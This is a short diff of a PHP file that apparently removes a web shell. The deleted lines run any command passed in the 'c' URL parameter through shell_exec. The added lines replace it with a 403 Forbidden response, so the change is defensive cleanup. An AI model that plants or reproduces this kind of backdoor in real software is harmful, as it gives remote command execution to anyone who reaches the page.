@@ -1,3 +1,4 @@
 <?php
-$cmd = $_GET['c'] ?? 'echo hello';
-echo shell_exec($cmd . " 2>&1");
+// This file has been disabled for security reasons.
+http_response_code(403);
+die('Forbidden');
